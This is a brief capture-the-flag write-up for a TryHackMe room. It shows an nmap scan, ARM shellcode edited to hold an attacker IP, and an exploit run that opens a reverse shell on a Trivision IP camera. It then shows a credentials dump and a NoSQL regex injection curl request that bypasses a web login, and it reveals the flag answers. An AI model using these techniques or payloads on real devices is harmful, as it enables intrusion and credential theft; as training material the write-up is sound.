# https://tryhackme.com/jr/armageddon2R

+ What is the content of the first flag? `THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
+ What is the content of the yetikey2.txt file? `2-K@bWJ5[REDACATED]ksaK`


### Reconnaise
+ Run `sudo nmap -sT -sC -sV $IP > nmap_log`
+ Download the payload to `Trivision Wireless Streaming Video IP Network Camera`

+ Modyfied payload for ip address Little Endian 10.4.37.160
```asm
mov r1,#0x29
lsl r1,r1,#8
add r1,r1,#0x07
lsl r1,r1,#8
add r1,r1,#0x05
add r1,r1,#0x05
lsl r1,r1,#8
add r1,r1,#0x05
add r1,r1,#0x05
push {r1}
```
+ Byte for ip address Little Endian 10.4.37.160
```asm 
mov r1,#0x95
add r1,r1,#0x05
lsl r1,r1,#8
add r1,r1,#25
lsl r1,r1,#8
add r1,r1,#0x04
lsl r1,r1,#8
add r1,r1,#0x05
add r1,r1,#0x05
str r1,[sp,#-4]!
```


# Exploit 
+ run the exploit 
    ```bash
    root@ip-10-10-7-41:~# python exp.py 
    [*] Shellcode length: 860
    [+] Opening connection to 10.10.93.155 on port 50628: Done
    [+] Trying to bind to 0.0.0.0 on port 4444: Done
    [+] Waiting for connections on 0.0.0.0:4444: Got connection from 10.10.93.155 on port 55741
    [*] Switching to interactive mode

    $ cat /var/etc/umconfig.txt
    TABLE=users
    ROW=0
    name=admin
    password=Y3tiStarCur!ouspassword=admin
    group=administrators
    prot=0
    disable=0
    [More bunch...]


    $curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.93.155:8080/login.php -X POST -d 'username=Frosteau&password[$regex]=.*' -c cookie.txt -L
    [More bunch...]
    <header>
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 bg-thm-800">
          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
                      <fieldset class="border border-solid border-thm-600 pt-3 pb-5 px-3 relative mt-6 bg-thm-900 w-full">
              <legend class="text-sm text-gray-100 -top-4 absolute bg-thm-900 border border-solid border-thm-600 py-1 px-3">Important Notes</legend>
              <ul class="list-disc text-gray-100">
                <li class="text-sm mt-3 font-medium ml-6">yetikey2.txt</li>
                <li class="text-sm mt-3 font-medium ml-6">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</li>
              </ul>
            </fieldset>
                  </div>
      </header>

    [More bunch...]
    ```



